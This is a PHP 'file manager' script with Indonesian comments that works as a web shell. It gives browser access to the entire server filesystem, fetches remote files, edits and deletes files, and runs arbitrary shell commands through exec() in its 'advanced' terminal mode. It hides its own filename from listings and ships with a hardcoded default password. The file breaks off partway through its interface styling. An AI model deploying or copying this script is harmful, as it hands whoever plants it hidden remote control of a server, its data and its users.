<?php
declare(strict_types=1);

/*
 * SoloFileManager — with simple login (Universal Directory Access)
 * Full FS access, upload URL, terminal, editor.
 * Ganti $FM_AUTH_USER dan $FM_AUTH_PASS di bawah sebelum dipakai.
 */

const SOLOFILEMANAGER_VERSION = '1.6.1-universal';

@set_time_limit(86400);
ini_set('display_errors', '0');
error_reporting(E_ALL);

// =========================
// CONFIG
// =========================

$isWindows = (PHP_OS_FAMILY === 'Windows');

// Root navigasi universal ('/' mengizinkan semua direktori di Linux/Unix & semua drive di Windows)
$ROOT_DIR = '/';

// Direktori awal saat pertama kali dibuka = folder tempat script ini berada
$scriptDir = realpath(__DIR__);
$START_DIR = str_replace('\\', '/', ($scriptDir !== false ? $scriptDir : __DIR__));
$START_DIR = rtrim($START_DIR, '/') ?: '/';

// Lokasi .trash diletakkan di folder script (atau temp dir jika tidak writable), bukan di '/'
$FM_TRASH_BASENAME = '.trash';
$TRASH_DIR = $START_DIR . '/' . $FM_TRASH_BASENAME;
if (!is_writable($START_DIR)) {
    $TRASH_DIR = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/sfm_trash_' . substr(md5(__FILE__), 0, 8);
}

$FM_ENABLE_TERMINAL_HERE     = true;
$FM_ENABLE_TERMINAL_MANUAL   = true;
$FM_ENABLE_TERMINAL_ADVANCED = true;

$FM_ENABLE_UPLOAD_URL   = true;
$FM_BLOCK_PRIVATE_IPS   = true;
$FM_UPLOAD_URL_TIMEOUT  = 300;

$FM_EDITOR_MAX_BYTES = 5 * 1024 * 1024;

$FM_COOKIE_SECURE = false; // true jika HTTPS

// =========================
// AUTH CONFIG — GANTI INI!
// =========================
$FM_AUTH_USER = 'admin';
$FM_AUTH_PASS = 'icarus';   // <-- ganti password ini sebelum dipakai

$EXCLUDE_NAMES = ['.', '..', basename(__FILE__)];

// =========================
// HELPERS
// =========================

function normPath(string $p): string {
    $p = str_replace('\\', '/', $p);
    return preg_replace('~/+~', '/', $p) ?: $p;
}
function safeRealpath(string $p): string {
    $rp = realpath($p);
    return normPath($rp !== false ? $rp : $p);
}
function pathInsideRoot(string $path, string $root): bool {
    $path = normPath(safeRealpath($path));
    $root = normPath(safeRealpath($root));

    if ($path === '' || $root === '') return false;

    // Root universal "/" mengizinkan semua path absolut (Unix maupun drive Windows)
    if ($root === '/') {
        if (strpos($path, '/') === 0) return true;
        if (PHP_OS_FAMILY === 'Windows' && preg_match('/^[A-Za-z]:\//', $path)) return true;
        return false;
    }

    $root = rtrim($root, '/');
    return $path === $root || strpos($path, $root . '/') === 0;
}
function fmRelFromRoot(string $abs, string $root): string {
    $p = rtrim(normPath(safeRealpath($abs)), '/');
    $r = rtrim(normPath(safeRealpath($root)), '/');
    if ($p === $r) return '';
    if ($r === '/' || $r === '') {
        return strpos($p, '/') === 0 ? ltrim($p, '/') : $p;
    }
    $prefix = $r . '/';
    return strpos($p, $prefix) === 0 ? substr($p, strlen($prefix)) : $p;
}
function fmHumanBytes(int $b): string {
    if ($b >= 1073741824) return round($b/1073741824, 2).' GB';
    if ($b >= 1048576)    return round($b/1048576, 1).' MB';
    if ($b >= 1024)       return round($b/1024, 1).' KB';
    return $b.' B';
}
function fmUtf8SafeText(string $t): string {
    if ($t === '' || preg_match('//u', $t)) return $t;
    if (function_exists('mb_convert_encoding')) {
        $c = @mb_convert_encoding($t, 'UTF-8', 'Windows-1252,ISO-8859-1,UTF-8');
        if (is_string($c) && preg_match('//u', $c)) return $c;
    }
    return @preg_replace('/[^\x09\x0A\x0D\x20-\x7E]/', '?', $t) ?: '';
}
function jsonOut($data): void {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
    exit;
}
function randomName(int $minLen = 12, int $maxLen = 16): string {
    $len = mt_rand($minLen, $maxLen);
    $ab = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $s = '';
    for ($i = 0; $i < $len; $i++) $s .= $ab[mt_rand(0, strlen($ab)-1)];
    return $s;
}
function fmIsExecAvailable(): bool {
    if (!function_exists('exec')) return false;
    $d = ini_get('disable_functions');
    if ($d === false || $d === '') return true;
    return !in_array('exec', array_map('trim', explode(',', strtolower($d))), true);
}

// =========================
// SESSION + CSRF
// =========================

function ensureSession(): void {
    if (session_status() === PHP_SESSION_ACTIVE) return;
    global $FM_COOKIE_SECURE;
    if (PHP_VERSION_ID >= 70300 && !headers_sent()) {
        session_set_cookie_params([
            'lifetime' => 0, 'path' => '/', 'domain' => '',
            'secure' => (bool)$FM_COOKIE_SECURE,
            'httponly' => true, 'samesite' => 'Lax',
        ]);
    }
    session_start();
}
function fmCsrfToken(): string {
    ensureSession();
    if (empty($_SESSION['fm_csrf']) || !is_string($_SESSION['fm_csrf'])) {
        $_SESSION['fm_csrf'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['fm_csrf'];
}

// =========================
// AUTH
// =========================

function fmIsLoggedIn(): bool {
    ensureSession();
    return !empty($_SESSION['fm_logged_in']) && $_SESSION['fm_logged_in'] === true;
}

function fmLogin(string $user, string $pass): bool {
    global $FM_AUTH_USER, $FM_AUTH_PASS;
    if (!hash_equals($FM_AUTH_USER, $user) || !hash_equals($FM_AUTH_PASS, $pass)) {
        return false;
    }
    ensureSession();
    session_regenerate_id(true);
    $_SESSION['fm_logged_in'] = true;
    $_SESSION['fm_login_time'] = time();
    return true;
}

function fmLogout(): void {
    ensureSession();
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p['path'], $p['domain'], $p['secure'], $p['httponly']);
    }
    session_destroy();
}

// =========================
// TRASH
// =========================

function fmTrashRoot(): string {
    global $TRASH_DIR;
    return rtrim(normPath($TRASH_DIR), '/');
}
function fmTrashEnsure(): bool {
    $T = fmTrashRoot();
    if (!is_dir($T) && !@mkdir($T, 0755, true)) return false;
    @file_put_contents($T . '/.htaccess', "Require all denied\nDeny from all\n");
    @file_put_contents($T . '/index.html', '');
    foreach (['files','info'] as $d) {
        if (!is_dir($T.'/'.$d)) @mkdir($T.'/'.$d, 0755, true);
    }
    return true;
}
function fmTrashStore(string $src, ?string $origRel): ?string {
    if (!fmTrashEnsure()) return null;
    $T = fmTrashRoot();
    $id = date('Ymd-His') . '-' . bin2hex(random_bytes(4));
    $isDir = is_dir($src) && !is_link($src);
    $info = [
        'name' => basename($src),
        'original_path' => $origRel,
        'type' => $isDir ? 'folder' : 'file',
        'size' => $isDir ? null : (int)@filesize($src),
        'deleted_at' => time(),
    ];
    if (@file_put_contents($T.'/info/'.$id.'.json', json_encode($info, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES)) === false) return null;
    if (!@rename($src, $T.'/files/'.$id)) { @unlink($T.'/info/'.$id.'.json'); return null; }
    return $id;
}

// =========================
// LIST / DELETE
// =========================

function getFilesAndFoldersList(string $path, string $rootDir, array $exclude = []): array {
    $folder = safeRealpath(rawurldecode($path));
    $out = ['folders'=>[], 'files'=>[]];
    if (!pathInsideRoot($folder, $rootDir) || !is_dir($folder)) return $out;
    $list = @scandir($folder);
    if ($list === false) return $out;
    $trashRoot = fmTrashRoot();
    $baseFolder = rtrim($folder, '/');
    foreach ($list as $f) {
        if (in_array($f, $exclude, true)) continue;
        $full = $baseFolder . '/' . $f;
        if (normPath($full) === $trashRoot) continue;
        $perms = @fileperms($full);
        $permissions = $perms !== false ? substr(sprintf('%o', $perms), -4) : '';
        $mtime = @filemtime($full) ?: null;
        if (is_dir($full)) {
            $out['folders'][$f] = ['permissions'=>$permissions,'mtime'=>$mtime];
        } elseif (is_file($full)) {
            $out['files'][$f] = [
                'ext'=>pathinfo($full, PATHINFO_EXTENSION),
                'size'=>@filesize($full) ?: 0,
                'permissions'=>$permissions,
                'mtime'=>$mtime,
            ];
        }
    }
    return $out;
}
function deletePath(string $path, string $rootDir): bool {
    if (!pathInsideRoot($path, $rootDir)) return false;
    if (is_link($path) || is_file($path)) return @unlink($path);
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items === false) return false;
        foreach ($items as $i) {
            if ($i === '.' || $i === '..') continue;
            if (!deletePath($path.'/'.$i, $rootDir)) return false;
        }
        return @rmdir($path);
    }
    return false;
}

// =========================
// UPLOAD FROM URL
// =========================

function fmIsPrivateUrl(string $url): bool {
    $host = parse_url($url, PHP_URL_HOST);
    if (!$host) return true;
    if (filter_var($host, FILTER_VALIDATE_IP)) {
        $ip = $host;
    } else {
        $ip = @gethostbyname($host);
        if (!filter_var($ip, FILTER_VALIDATE_IP)) return true;
    }
    return !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
}
function fmUploadFromUrl(string $url, string $targetDir, string $rootDir): array {
    global $FM_ENABLE_UPLOAD_URL, $FM_BLOCK_PRIVATE_IPS, $FM_UPLOAD_URL_TIMEOUT;
    if (!$FM_ENABLE_UPLOAD_URL) return ['status'=>'error','msg'=>'Upload from URL disabled'];
    if ($url === '' || !filter_var($url, FILTER_VALIDATE_URL)) return ['status'=>'error','msg'=>'URL tidak valid'];
    $scheme = strtolower((string)parse_url($url, PHP_URL_SCHEME));
    if (!in_array($scheme, ['http','https'], true)) return ['status'=>'error','msg'=>'Hanya http/https'];
    if ($FM_BLOCK_PRIVATE_IPS && fmIsPrivateUrl($url)) return ['status'=>'error','msg'=>'URL mengarah ke IP privat/loopback (diblokir)'];

    $targetDir = safeRealpath($targetDir);
    if (!pathInsideRoot($targetDir, $rootDir) || !is_dir($targetDir)) return ['status'=>'error','msg'=>'Folder tujuan tidak valid'];

    $basename = basename((string)(parse_url($url, PHP_URL_PATH) ?: ''));
    if ($basename === '' || $basename === '.' || $basename === '..') $basename = randomName(12,16);
    $basename = preg_replace('/[\\\\\/:*?"<>|]/', '_', $basename) ?: randomName(12,16);
    $dest = rtrim($targetDir, '/') . '/' . $basename;
    $i = 1;
    while (file_exists($dest)) {
        $pi = pathinfo($basename);
        $stem = $pi['filename'] ?? $basename;
        $ext = isset($pi['extension']) ? '.'.$pi['extension'] : '';
        $dest = rtrim($targetDir, '/').'/'.$stem.' ('.$i.')'.$ext;
        $i++;
    }

    $bytes = 0;
    if (function_exists('curl_init')) {
        $fp = @fopen($dest, 'wb');
        if (!$fp) return ['status'=>'error','msg'=>'Tidak bisa menulis file'];
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_FILE=>$fp, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_MAXREDIRS=>5,
            CURLOPT_TIMEOUT=>$FM_UPLOAD_URL_TIMEOUT, CURLOPT_CONNECTTIMEOUT=>15,
            CURLOPT_SSL_VERIFYPEER=>true, CURLOPT_USERAGENT=>'SoloFileManager/'.SOLOFILEMANAGER_VERSION,
            CURLOPT_PROTOCOLS=>CURLPROTO_HTTP|CURLPROTO_HTTPS,
        ]);
        $ok = curl_exec($ch);
        $err = $ok === false ? curl_error($ch) : null;
        $http = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch); fclose($fp);
        if ($ok === false || $http >= 400) {
            @unlink($dest);
            return ['status'=>'error','msg'=>'Gagal unduh: '.($err ?: "HTTP $http")];
        }
        $bytes = (int)@filesize($dest);
    } else {
        $ctx = stream_context_create([
            'http'=>['timeout'=>$FM_UPLOAD_URL_TIMEOUT,'follow_location'=>1,'max_redirects'=>5,
                     'user_agent'=>'SoloFileManager/'.SOLOFILEMANAGER_VERSION],
            'ssl'=>['verify_peer'=>true,'verify_peer_name'=>true],
        ]);
        $in = @fopen($url, 'rb', false, $ctx);
        if (!$in) return ['status'=>'error','msg'=>'Gagal membuka URL'];
        $out = @fopen($dest, 'wb');
        if (!$out) { fclose($in); return ['status'=>'error','msg'=>'Tidak bisa menulis file']; }
        $bytes = (int)stream_copy_to_stream($in, $out);
        fclose($in); fclose($out);
    }
    @chmod($dest, 0644);
    return ['status'=>'success','name'=>basename($dest),'size'=>$bytes,'path'=>fmRelFromRoot($dest, $rootDir)];
}

// =========================
// TERMINAL
// =========================

function fmTerminalPresets(): array {
    global $isWindows;
    if ($isWindows) {
        return [
            'pwd'  => ['label'=>'Print working directory','cmd'=>'cd'],
            'list' => ['label'=>'List files (dir)','cmd'=>'dir'],
            'phpv' => ['label'=>'PHP version','cmd'=>'php -v'],
            'git'  => ['label'=>'Git status','cmd'=>'git status --short --branch'],
        ];
    }
    return [
        'pwd'  => ['label'=>'Print working directory','cmd'=>'pwd'],
        'list' => ['label'=>'List files (ls -la)','cmd'=>'ls -la'],
        'phpv' => ['label'=>'PHP version','cmd'=>'php -v'],
        'git'  => ['label'=>'Git status','cmd'=>'git status --short --branch'],
    ];
}
function fmBuildManualCommand(string $input, bool $isWindows): array {
    $raw = trim($input);
    if ($raw === '') return ['status'=>'error','msg'=>'Command required'];
    if (strlen($raw) > 180) return ['status'=>'error','msg'=>'Command too long'];
    if (preg_match('/[\r\n;&|`<>]/', $raw)) return ['status'=>'error','msg'=>'Blocked shell characters'];
    $parts = preg_split('/\s+/', $raw) ?: [];
    $cmd = strtolower((string)array_shift($parts));
    $args = array_values($parts);
    if ($cmd === 'whoami') {
        if ($args) return ['status'=>'error','msg'=>'whoami takes no args'];
        return ['status'=>'success','exe'=>'whoami','args'=>[],'label'=>'whoami'];
    }
    if ($cmd === 'php') {
        if (!in_array($args, [['-v'],['--version'],['-m'],['--ini']], true)) {
            return ['status'=>'error','msg'=>'Allowed: php -v | -m | --ini'];
        }
        return ['status'=>'success','exe'=>'php','args'=>$args,'label'=>'php '.implode(' ',$args)];
    }
    if ($cmd === 'git') {
        $ok = in_array($args, [['status'],['status','--short'],['status','--branch'],['status','--short','--branch'],
                               ['rev-parse','--is-inside-work-tree'],['branch','--show-current']], true);
        if (!$ok) return ['status'=>'error','msg'=>'Allowed git: status | rev-parse | branch'];
        return ['status'=>'success','exe'=>'git','args'=>$args,'label'=>'git '.implode(' ',$args)];
    }
    return ['status'=>'error','msg'=>'Only git, php, whoami allowed in manual mode'];
}
function fmBuildEscaped(string $exe, array $args = []): string {
    $c = escapeshellcmd($exe);
    foreach ($args as $a) $c .= ' ' . escapeshellarg((string)$a);
    return $c;
}
function fmRunTerminal(string $dir, string $mode, string $cmdId, string $input, string $rootDir): array {
    global $FM_ENABLE_TERMINAL_HERE, $FM_ENABLE_TERMINAL_MANUAL, $FM_ENABLE_TERMINAL_ADVANCED, $isWindows;
    if (!$FM_ENABLE_TERMINAL_HERE) return ['status'=>'error','msg'=>'Terminal disabled'];
    if (!fmIsExecAvailable()) return ['status'=>'error','msg'=>'exec() disabled on server'];
    $real = realpath($dir);
    if ($real === false) return ['status'=>'error','msg'=>'Invalid folder'];
    $real = normPath($real);
    if (!pathInsideRoot($real, $rootDir) || !is_dir($real)) return ['status'=>'error','msg'=>'Invalid folder'];
    $mode = strtolower(trim($mode));
    $runLabel = ''; $runCmd = '';
    if ($mode === 'advanced') {
        if (!$FM_ENABLE_TERMINAL_ADVANCED) return ['status'=>'error','msg'=>'Advanced mode disabled'];
        $raw = trim($input);
        if ($raw === '') return ['status'=>'error','msg'=>'Command required'];
        if (strlen($raw) > 400) return ['status'=>'error','msg'=>'Command too long'];
        if (preg_match('/[\r\n]/', $raw)) return ['status'=>'error','msg'=>'Multiline not allowed'];
        $runLabel = $raw; $runCmd = $raw;
    } elseif ($mode === 'manual') {
        if (!$FM_ENABLE_TERMINAL_MANUAL) return ['status'=>'error','msg'=>'Manual mode disabled'];
        $b = fmBuildManualCommand($input, $isWindows);
        if (($b['status']??'error') !== 'success') return $b;
        $runLabel = (string)$b['label'];
        $runCmd = fmBuildEscaped((string)$b['exe'], (array)$b['args']);
    } else {
        $map = fmTerminalPresets();
        if (!isset($map[$cmdId])) return ['status'=>'error','msg'=>'Unknown command'];
        $runLabel = $map[$cmdId]['label'];
        $runCmd = $map[$cmdId]['cmd'];
    }
    $old = @getcwd() ?: null;
    if (!@chdir($real)) return ['status'=>'error','msg'=>'Cannot enter folder'];
    $out = []; $code = 1;
    @exec($runCmd . ' 2>&1', $out, $code);
    if ($old !== null) @chdir($old);
    $max = 400; $truncated = false;
    if (count($out) > $max) { $out = array_slice($out, 0, $max); $out[] = '[truncated]'; $truncated = true; }
    return [
        'status'=>'success','command'=>$cmdId,'label'=>$runLabel,
        'output'=>fmUtf8SafeText(implode("\n", $out)),
        'exit_code'=>(int)$code,'truncated'=>$truncated,
    ];
}

// =========================
// BOOTSTRAP
// =========================

ensureSession();
$csrf = fmCsrfToken();
$action = (string)($_POST['action'] ?? $_GET['action'] ?? '');

// Handle login / logout
if ($action === 'login') {
    $user = trim((string)($_POST['username'] ?? ''));
    $pass = (string)($_POST['password'] ?? '');
    if (fmLogin($user, $pass)) {
        jsonOut(['status' => 'success']);
    }
    jsonOut(['status' => 'error', 'msg' => 'Username atau password salah']);
}

if ($action === 'logout') {
    fmLogout();
    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) || isset($_POST['ajax'])) {
        jsonOut(['status' => 'success']);
    }
    header('Location: ' . ($_SERVER['PHP_SELF'] ?? ''));
    exit;
}

// Require auth for all other actions
if ($action !== '' && $action !== 'login' && $action !== 'logout') {
    if (!fmIsLoggedIn()) {
        jsonOut(['status' => 'error', 'msg' => 'Unauthorized', 'need_login' => true]);
    }
}

// =========================
// API ACTIONS
// =========================

if ($action !== '' && $action !== 'login' && $action !== 'logout') {

    if ($action === 'list') {
        $dir = (string)($_GET['dir'] ?? $START_DIR);
        $dir = safeRealpath(rawurldecode($dir));
        if (!pathInsideRoot($dir, $ROOT_DIR) || !is_dir($dir)) {
            jsonOut(['status'=>'error','msg'=>'Invalid directory: '.$dir]);
        }
        $data = getFilesAndFoldersList($dir, $ROOT_DIR, $EXCLUDE_NAMES);
        $parent = normPath(dirname($dir));
        if ($isWindows && preg_match('/^[A-Za-z]:$/', $parent)) {
            $parent .= '/';
        }
        $parentOk = pathInsideRoot($parent, $ROOT_DIR) && rtrim($parent, '/') !== rtrim($dir, '/');
        jsonOut([
            'status'=>'success',
            'dir'=>$dir,
            'rel'=>fmRelFromRoot($dir, $ROOT_DIR),
            'parent'=>$parentOk ? $parent : null,
            'folders'=>$data['folders'],
            'files'=>$data['files'],
            'is_windows'=>$isWindows,
        ]);
    }

    if ($action === 'mkdir') {
        $dir = safeRealpath(rawurldecode((string)($_POST['dir'] ?? '')));
        $name = trim((string)($_POST['name'] ?? ''));
        if (!pathInsideRoot($dir, $ROOT_DIR) || !is_dir($dir)) jsonOut(['status'=>'error','msg'=>'Invalid dir']);
        if ($name === '' || preg_match('/[\\\\\/:*?"<>|]/', $name)) jsonOut(['status'=>'error','msg'=>'Invalid name']);
        $target = rtrim($dir, '/').'/'.$name;
        if (file_exists($target)) jsonOut(['status'=>'error','msg'=>'Already exists']);
        if (!@mkdir($target, 0755)) jsonOut(['status'=>'error','msg'=>'mkdir failed']);
        jsonOut(['status'=>'success']);
    }

    if ($action === 'upload') {
        $dir = safeRealpath(rawurldecode((string)($_POST['dir'] ?? '')));
        if (!pathInsideRoot($dir, $ROOT_DIR) || !is_dir($dir)) jsonOut(['status'=>'error','msg'=>'Invalid dir']);
        if (empty($_FILES['files'])) jsonOut(['status'=>'error','msg'=>'No files']);
        $saved = []; $errors = [];
        $files = $_FILES['files'];
        $names = is_array($files['name']) ? $files['name'] : [$files['name']];
        $tmps  = is_array($files['tmp_name']) ? $files['tmp_name'] : [$files['tmp_name']];
        $errs  = is_array($files['error']) ? $files['error'] : [$files['error']];
        foreach ($names as $i => $n) {
            if ((int)$errs[$i] !== UPLOAD_ERR_OK) { $errors[] = $n.': upload error '.$errs[$i]; continue; }
            $safe = basename((string)$n);
            $safe = preg_replace('/[\\\\\/:*?"<>|]/', '_', $safe);
            if ($safe === '' || $safe === '.' || $safe === '..') { $errors[] = 'invalid name'; continue; }
            $dest = rtrim($dir, '/').'/'.$safe;
            $k = 1;
            while (file_exists($dest)) {
                $pi = pathinfo($safe);
                $stem = $pi['filename'] ?? $safe;
                $ext = isset($pi['extension']) ? '.'.$pi['extension'] : '';
                $dest = rtrim($dir, '/').'/'.$stem.' ('.$k.')'.$ext; $k++;
            }
            if (@move_uploaded_file($tmps[$i], $dest)) { $saved[] = basename($dest); @chmod($dest, 0644); }
            else $errors[] = $safe.': move failed';
        }
        jsonOut(['status'=>'success','saved'=>$saved,'errors'=>$errors]);
    }

    if ($action === 'upload_from_url') {
        $url = trim((string)($_POST['url'] ?? ''));
        $dir = (string)($_POST['dir'] ?? '');
        jsonOut(fmUploadFromUrl($url, $dir, $ROOT_DIR));
    }

    if ($action === 'download') {
        $path = safeRealpath(rawurldecode((string)($_GET['path'] ?? '')));
        if (!pathInsideRoot($path, $ROOT_DIR) || !is_file($path)) {
            http_response_code(404); echo 'Not found'; exit;
        }
        while (ob_get_level()) @ob_end_clean();
        header('Content-Type: application/octet-stream');
        header('Content-Length: '.filesize($path));
        $safe = str_replace(['"',"\r","\n"], '', basename($path));
        header('Content-Disposition: attachment; filename="'.$safe.'"');
        header('Cache-Control: no-store');
        readfile($path);
        exit;
    }

    if ($action === 'delete') {
        $path = safeRealpath(rawurldecode((string)($_POST['path'] ?? '')));
        if (!pathInsideRoot($path, $ROOT_DIR) || !file_exists($path)) jsonOut(['status'=>'error','msg'=>'Not found']);
        $isFsRoot = ($path === '/' || ($isWindows && preg_match('/^[A-Za-z]:\/?$/', $path)));
        if ($isFsRoot) jsonOut(['status'=>'error','msg'=>'Cannot delete root']);
        $rel = fmRelFromRoot($path, $ROOT_DIR);
        $id = fmTrashStore($path, $rel ?: null);
        if ($id === null) jsonOut(['status'=>'error','msg'=>'Trash failed']);
        jsonOut(['status'=>'success','trash_id'=>$id]);
    }

    if ($action === 'delete_permanent') {
        $path = safeRealpath(rawurldecode((string)($_POST['path'] ?? '')));
        if (!pathInsideRoot($path, $ROOT_DIR) || !file_exists($path)) jsonOut(['status'=>'error','msg'=>'Not found']);
        $isFsRoot = ($path === '/' || ($isWindows && preg_match('/^[A-Za-z]:\/?$/', $path)));
        if ($isFsRoot) jsonOut(['status'=>'error','msg'=>'Cannot delete root']);
        if (!deletePath($path, $ROOT_DIR)) jsonOut(['status'=>'error','msg'=>'Delete failed']);
        jsonOut(['status'=>'success']);
    }

    if ($action === 'rename') {
        $path = safeRealpath(rawurldecode((string)($_POST['path'] ?? '')));
        $new = trim((string)($_POST['name'] ?? ''));
        if (!pathInsideRoot($path, $ROOT_DIR) || !file_exists($path)) jsonOut(['status'=>'error','msg'=>'Not found']);
        if ($new === '' || preg_match('/[\\\\\/:*?"<>|]/', $new)) jsonOut(['status'=>'error','msg'=>'Invalid name']);
        $dest = rtrim(normPath(dirname($path)), '/').'/'.$new;
        if (file_exists($dest)) jsonOut(['status'=>'error','msg'=>'Target exists']);
        if (!@rename($path, $dest)) jsonOut(['status'=>'error','msg'=>'Rename failed']);
        jsonOut(['status'=>'success','path'=>$dest]);
    }

    if ($action === 'chmod') {
        $path = safeRealpath(rawurldecode((string)($_POST['path'] ?? '')));
        $modeStr = (string)($_POST['mode'] ?? '');
        if (!pathInsideRoot($path, $ROOT_DIR) || !file_exists($path)) jsonOut(['status'=>'error','msg'=>'Not found']);
        if (!preg_match('/^0?[0-7]{3}$/', $modeStr)) jsonOut(['status'=>'error','msg'=>'Invalid mode']);
        $mode = octdec($modeStr);
        if (!@chmod($path, $mode)) jsonOut(['status'=>'error','msg'=>'chmod failed']);
        jsonOut(['status'=>'success']);
    }

    if ($action === 'info') {
        jsonOut(['status'=>'success','info'=>[
            'version'=>SOLOFILEMANAGER_VERSION,
            'php'=>PHP_VERSION,
            'os'=>PHP_OS,
            'root'=>$ROOT_DIR,
            'start_dir'=>$START_DIR,
            'open_basedir'=>ini_get('open_basedir') ?: '(none)',
            'exec_available'=>fmIsExecAvailable(),
            'zip_archive'=>class_exists('ZipArchive'),
            'curl'=>function_exists('curl_init'),
            'upload_max'=>ini_get('upload_max_filesize'),
            'post_max'=>ini_get('post_max_size'),
            'memory_limit'=>ini_get('memory_limit'),
            'max_execution_time'=>ini_get('max_execution_time'),
            'terminal'=>['here'=>$FM_ENABLE_TERMINAL_HERE,'manual'=>$FM_ENABLE_TERMINAL_MANUAL,'advanced'=>$FM_ENABLE_TERMINAL_ADVANCED],
            'upload_url'=>$FM_ENABLE_UPLOAD_URL,
        ]]);
    }

    if ($action === 'terminal_run') {
        jsonOut(fmRunTerminal(
            (string)($_POST['dir'] ?? ''),
            (string)($_POST['mode'] ?? 'preset'),
            (string)($_POST['cmd'] ?? ''),
            (string)($_POST['input'] ?? ''),
            $ROOT_DIR
        ));
    }

    if ($action === 'file_read') {
        $path = safeRealpath(rawurldecode((string)($_POST['path'] ?? '')));
        if (!pathInsideRoot($path, $ROOT_DIR) || !is_file($path)) jsonOut(['status'=>'error','msg'=>'Invalid file']);
        $size = (int)@filesize($path);
        if ($size > $FM_EDITOR_MAX_BYTES) jsonOut(['status'=>'error','msg'=>'File > '.fmHumanBytes($FM_EDITOR_MAX_BYTES).' — use download']);
        $raw = @file_get_contents($path);
        if ($raw === false) jsonOut(['status'=>'error','msg'=>'Read failed']);
        if (strpos($raw, "\0") !== false) jsonOut(['status'=>'error','msg'=>'Binary file — cannot edit']);
        jsonOut(['status'=>'success','path'=>$path,'content'=>fmUtf8SafeText($raw),'size'=>$size]);
    }

    if ($action === 'file_save') {
        $path = safeRealpath(rawurldecode((string)($_POST['path'] ?? '')));
        $content = (string)($_POST['content'] ?? '');
        if (!pathInsideRoot($path, $ROOT_DIR) || !is_file($path)) jsonOut(['status'=>'error','msg'=>'Invalid file']);
        if (!is_writable($path)) jsonOut(['status'=>'error','msg'=>'File not writable']);
        @copy($path, $path.'.bak.'.date('YmdHis'));
        $n = @file_put_contents($path, $content, LOCK_EX);
        if ($n === false) jsonOut(['status'=>'error','msg'=>'Save failed']);
        jsonOut(['status'=>'success','bytes'=>$n]);
    }

    jsonOut(['status'=>'error','msg'=>'Unknown action: '.$action]);
}

// =========================
// UI
// =========================

// Show login form if not authenticated
if (!fmIsLoggedIn()) {
?><!doctype html>
<html><head><meta charset="utf-8"><title>Login — SoloFileManager</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{font-family:system-ui,-apple-system,Segoe UI,Arial;background:#111;color:#ddd;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:#1e1e1e;padding:32px;border-radius:12px;width:min(380px,92vw);box-shadow:0 8px 32px rgba(0,0,0,.5)}
.login-box h1{margin:0 0 8px;font-size:20px;color:#0a84ff;text-align:center}
.login-box p{margin:0 0 24px;font-size:13px;color:#888;text-align:center}
.login-box label{display:block;font-size:12px;color:#aaa;margin-bottom:6px}
.login-box input{width:100%;background:#000;color:#0f0;border:1px solid #333;padding:12px;border-radius:6px;font-size:14px;margin-bottom:16px;font-family:monospace}
.login-box input:focus{outline:none;border-color:#0a84ff}
.login-box button{width:100%;background:#0a84ff;color:#fff;border:none;padding:12px;border-radius:6px;font-size:14px;cursor:pointer;font-weight:600}
.login-box button:hover{background:#0070e0}
.login-box button:disabled{opacity:.6;cursor:not-allowed}
.error{background:#3a1a1a;color:#ff6b6b;padding:10px;border-radius:6px;font-size:13px;margin-bottom:16px;display:none;text-align:center}
</style></head><body>
<div class="login-box">
    <h1>📂 SoloFileManager</h1>
    <p>Silakan login untuk melanjutkan</p>
    <div class="error" id="login-error"></div>
    <form id="login-form" onsubmit="return doLogin(event)">
        <label>Username</label>
        <input type="text" id="username" name="username" autocomplete="username" required autofocus>
        <label>Password</label>
        <input type="password" id="password" name="password" autocomplete="current-password" required>
        <button type="submit" id="login-btn">Login</button>
    </form>
</div>
<script>
const FM_URL = <?= json_encode($_SERVER['PHP_SELF'] ?? '') ?>;
async function doLogin(e) {
    e.preventDefault();
    const btn = document.getElementById('login-btn');
    const err = document.getElementById('login-error');
    btn.disabled = true;
    err.style.display = 'none';
    const fd = new FormData();
    fd.append('action', 'login');
    fd.append('username', document.getElementById('username').value);
    fd.append('password', document.getElementById('password').value);
    try {
        const r = await fetch(FM_URL, {method:'POST', body:fd, credentials:'same-origin'});
        const j = await r.json();
        if (j.status === 'success') {
            location.reload();
        } else {
            err.textContent = j.msg || 'Login gagal';
            err.style.display = 'block';
            btn.disabled = false;
        }
    } catch (ex) {
        err.textContent = 'Network error';
        err.style.display = 'block';
        btn.disabled = false;
    }
    return false;
}
</script>
</body></html>
<?php
    exit;
}

// Authenticated UI
?><!doctype html>
<html><head><meta charset="utf-8"><title>SoloFileManager</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{font-family:system-ui,-apple-system,Segoe UI,Arial;background:#111;color:#ddd;margin:0}
header{background:#1e1e1e;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #333;position:sticky;top:0;z-index:10;flex-wrap:wrap}
header h1{font-size:15px;margin:0;color:#0a84ff}
header .path-bar{flex:1;display:flex;gap:6px;min-width:220px}
header .path-bar input{flex:1;background:#000;color:#0f0;border:1px solid #333;padding:5px 10px;border-radius:4px;font-family:monospace;font-size:12px}
header .path-bar input:focus{outline:none;border-color:#0a84ff}
header button{background:#0a84ff;color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:12px}
header button.ghost{background:#333}
header button.ghost:hover{background:#444}
header button:hover{background:#0070e0}
header button.logout{background:#333;color:#ff6b6b}
header button.logout:hover{background:#442222}
main{padding:16px;max-width:1400px;margin:0 auto}
table{width:100%;border-collapse:collapse;font-size:13px}
